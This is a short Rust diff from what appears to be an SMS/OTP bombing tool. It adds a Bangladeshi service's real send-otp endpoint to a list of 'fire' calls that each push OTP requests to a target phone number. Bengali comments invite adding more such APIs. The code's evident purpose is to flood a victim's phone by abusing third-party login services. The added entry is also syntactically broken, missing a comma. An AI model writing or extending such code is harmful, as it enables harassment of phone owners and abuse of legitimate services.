@@ -206,6 +206,15 @@ fire("easy com bd",
         "email": "dangerousboytushar@gmail.com"
     })
 ),
+
+fire("My Guradian BD"
+ "https://gliapp.myguardianbd.com/auth-gate/api/access/send-otp"
+     json!({
+  "mobileNumber": &number,
+  "type": null
+})
+), 
+        
         // ── এখানে নতুন API যোগ করো ──
         // fire("API নাম", "https://api.url", json!({"phone": &number})),
         // fire("API নাম", "https://api.url", json!({"mobile": &bd_full})),
